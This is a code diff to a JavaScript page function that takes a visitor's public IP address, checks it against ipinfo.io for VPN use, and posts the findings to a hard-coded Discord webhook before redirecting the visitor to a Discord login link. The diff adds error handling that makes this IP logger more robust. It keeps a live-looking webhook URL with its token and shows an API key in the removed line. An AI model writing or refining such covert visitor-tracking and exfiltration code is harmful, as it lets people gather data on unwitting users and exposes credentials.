@@ -12,7 +12,7 @@
     }
 
     function getMyIP() {
-        let apiKey = '3dc9adbe58e5e216.fff70c02d7f2504d629bef86fc31b7f18eef700cc36d644c5d30363885290381';
+        let apiKey = 'YOUR_API_KEY';  // Replace with your actual ipinfo.io API key
         let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
 
         // Fetch the public IP address of the user
@@ -21,12 +21,17 @@
             .then(ipData => {
                 const ip = ipData.ip;
                 
-                // Check if the IP belongs to a VPN using ipinfo.io (or any other API)
-                fetch(`https://ipinfo.io/${ip}/json?token=YOUR_API_KEY`)
-                    .then(response => response.json())
+                // Check if the IP belongs to a VPN using ipinfo.io (replace with a real API key)
+                fetch(`https://ipinfo.io/${ip}/json?token=${apiKey}`)
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Failed to fetch IP info');
+                        }
+                        return response.json();
+                    })
                     .then(ipInfo => {
                         const isVpn = ipInfo.org && ipInfo.org.toLowerCase().includes("vpn");
-                        
+
                         // If a VPN is detected, send a webhook with that information
                         let message = {
                             embeds: [
@@ -50,8 +55,16 @@
                             body: JSON.stringify(message)
                         }).then(() => {
                             window.location.href = "https://discord.gg/login";
+                        }).catch(err => {
+                            console.error('Error sending to webhook:', err);
                         });
+                    })
+                    .catch(err => {
+                        console.error('Error fetching IP info:', err);
                     });
+            })
+            .catch(err => {
+                console.error('Error fetching IP address:', err);
             });
     }
 
